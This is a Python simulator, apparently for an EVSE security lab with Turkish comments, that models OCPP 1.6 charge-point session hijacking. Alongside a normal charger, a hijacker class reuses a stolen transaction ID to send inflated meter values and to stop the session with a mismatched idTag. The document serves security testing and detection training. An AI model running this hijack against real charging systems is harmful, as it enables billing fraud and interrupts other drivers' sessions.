"""
EVSE Security Lab - Session Hijacking Scenario
Charge Point Simulator
Author: Hasan Sido
"""

import time
import logging
from ocpp.v16 import ChargePoint as Cp
from ocpp.v16 import call as call_module
from ocpp.v16.enums import ChargePointStatus

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# OCPP isteği (request) sınıflarını, hem Xyz hem XyzPayload ismini deneyerek çöz.
def _resolve_req(name):
    cls = getattr(call_module, f"{name}Payload", None)
    if cls is not None:
        return cls
    cls = getattr(call_module, name, None)
    if cls is not None:
        return cls
    raise ImportError(f"{name} için uygun OCPP sınıfı bulunamadı.")


BootNotificationReq = _resolve_req("BootNotification")
StartTransactionReq = _resolve_req("StartTransaction")
StatusNotificationReq = _resolve_req("StatusNotification")
MeterValuesReq = _resolve_req("MeterValues")
StopTransactionReq = _resolve_req("StopTransaction")


class SimulatedChargePoint(Cp):
    """Normal kullanıcının şarj noktası simülatörü"""
    
    def __init__(self, charge_point_id, connection):
        super().__init__(charge_point_id, connection)
        self.connector_id = 1
        self.current_status = ChargePointStatus.available
        self.session_active = False
        self.transaction_id = None
        self.meter_value = 0.0  # kWh
        self.id_tag = "USER_HASAN_001"  # Gerçek kullanıcı ID'si

    async def send_boot_notification(self):
        """Boot notification gönder"""
        req = BootNotificationReq(
            charge_point_model="CP-V1-HASAN",
            charge_point_vendor="TeamHasan",
        )
        response = await self.call(req)
        logger.info(f"✅ [{self.id}] BootNotification gönderildi: {response.status}")
        return response

    async def send_status_notification(self, status: ChargePointStatus):
        """Durum bildirimi gönder"""
        req = StatusNotificationReq(
            connector_id=self.connector_id,
            error_code="NoError",
            status=status,
        )
        await self.call(req)
        self.current_status = status
        logger.info(f"📊 [{self.id}] StatusNotification: {status}")

    async def start_charging(self):
        """Şarj oturumu başlat"""
        if self.session_active:
            logger.warning(f"⚠️ [{self.id}] Oturum zaten aktif!")
            return
        
        self.transaction_id = int(time.time() * 1000)  # Timestamp-based unique ID
        req = StartTransactionReq(
            connector_id=self.connector_id,
            id_tag=self.id_tag,
            meter_start=int(self.meter_value * 1000),  # Wh cinsinden
            timestamp=time.strftime("%Y-%m-%dT%H:%M:%S") + "Z",
        )
        response = await self.call(req)
        self.session_active = True
        logger.info(f"🔋 [{self.id}] StartTransaction: transactionId={self.transaction_id}, idTag={self.id_tag}")
        
        await self.send_status_notification(ChargePointStatus.charging)
        return response

    async def simulate_meter_values(self, step_kwh: float = 0.5):
        """Sayaç değerlerini simüle et ve gönder"""
        if self.session_active and self.current_status == ChargePointStatus.charging:
            self.meter_value += step_kwh
            req = MeterValuesReq(
                connector_id=self.connector_id,
                meter_value=[{
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S") + "Z",
                    "sampledValue": [{
                        "value": str(int(self.meter_value * 1000)),  # Wh
                        "unit": "Wh",
                        "context": "Sample.Periodic",
                        "measurand": "Energy.Active.Import.Register",
                    }],
                }],
                transaction_id=self.transaction_id,
            )
            await self.call(req)
            logger.info(f"⚡ [{self.id}] MeterValues: {self.meter_value:.2f} kWh (transactionId={self.transaction_id})")

    async def stop_charging(self):
        """Şarj oturumunu sonlandır"""
        if not self.session_active:
            logger.warning(f"⚠️ [{self.id}] Sonlandırılacak aktif oturum yok!")
            return
        
        req = StopTransactionReq(
            transaction_id=self.transaction_id,
            meter_stop=int(self.meter_value * 1000),  # Wh
            timestamp=time.strftime("%Y-%m-%dT%H:%M:%S") + "Z",
            id_tag=self.id_tag,
        )
        response = await self.call(req)
        logger.info(f"🛑 [{self.id}] StopTransaction: transactionId={self.transaction_id}, meter={self.meter_value:.2f} kWh")
        
        self.session_active = False
        await self.send_status_notification(ChargePointStatus.finishing)
        await self.send_status_notification(ChargePointStatus.available)
        return response


class HijackerChargePoint(Cp):
    """Saldırgan (Session Hijacker) şarj noktası simülatörü"""
    
    def __init__(self, charge_point_id, connection, stolen_transaction_id, stolen_id_tag):
        super().__init__(charge_point_id, connection)
        self.connector_id = 2  # Farklı connector ID (saldırgan farklı cihazdan bağlanıyor)
        self.stolen_transaction_id = stolen_transaction_id
        self.stolen_id_tag = stolen_id_tag
        self.hijacker_id_tag = "ATTACKER_HASAN_999"  # Saldırganın kendi ID'si
        self.meter_value = 5.0  # Saldırgan farklı sayaç değeri gönderecek
        
    async def send_boot_notification(self):
        """Saldırgan boot notification gönder"""
        req = BootNotificationReq(
            charge_point_model="CP-HIJACKER",
            charge_point_vendor="ATTACKER",
        )
        response = await self.call(req)
        logger.error(f"🚨 [{self.id}] SALDIRGAN BootNotification: {response.status}")
        return response

    async def hijack_meter_values(self):
        """Çalınan transactionId ile MeterValues gönder (farklı idTag veya değerlerle)"""
        logger.error(f"🔴 [{self.id}] SESSION HIJACK: Çalınan transactionId={self.stolen_transaction_id} ile MeterValues gönderiliyor!")
        
        req = MeterValuesReq(
            connector_id=self.connector_id,  # Farklı connector!
            meter_value=[{
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S") + "Z",
                "sampledValue": [{
                    "value": str(int(self.meter_value * 1000)),  # Manipüle edilmiş değer
                    "unit": "Wh",
                    "context": "Sample.Periodic",
                    "measurand": "Energy.Active.Import.Register",
                }],
            }],
            transaction_id=self.stolen_transaction_id,  # ÇALINMIŞ TRANSACTION ID!
        )
        await self.call(req)
        logger.error(f"⚠️ ANOMALI: Farklı connector ({self.connector_id}) ile transactionId={self.stolen_transaction_id} kullanıldı!")
        self.meter_value += 2.0  # Saldırgan sayacı manipüle ediyor

    async def hijack_stop_transaction(self, use_wrong_id_tag=True):
        """Çalınan transactionId ile StopTransaction gönder (idTag mismatch)"""
        id_tag_to_use = self.hijacker_id_tag if use_wrong_id_tag else self.stolen_id_tag
        
        logger.error(f"🔴 [{self.id}] SESSION HIJACK: transactionId={self.stolen_transaction_id} ile StopTransaction gönderiliyor!")
        logger.error(f"⚠️ ANOMALI: Gerçek idTag={self.stolen_id_tag}, Kullanılan idTag={id_tag_to_use}")
        
        req = StopTransactionReq(
            transaction_id=self.stolen_transaction_id,  # ÇALINMIŞ TRANSACTION ID!
            meter_stop=int(self.meter_value * 1000),  # Manipüle edilmiş sayaç değeri
            timestamp=time.strftime("%Y-%m-%dT%H:%M:%S") + "Z",
            id_tag=id_tag_to_use,  # YANLIŞ ID TAG (idTag mismatch)
        )
        response = await self.call(req)
        logger.error(f"🛑 SALDIRI TAMAMLANDI: Oturum saldırgan tarafından kapatıldı!")
        return response
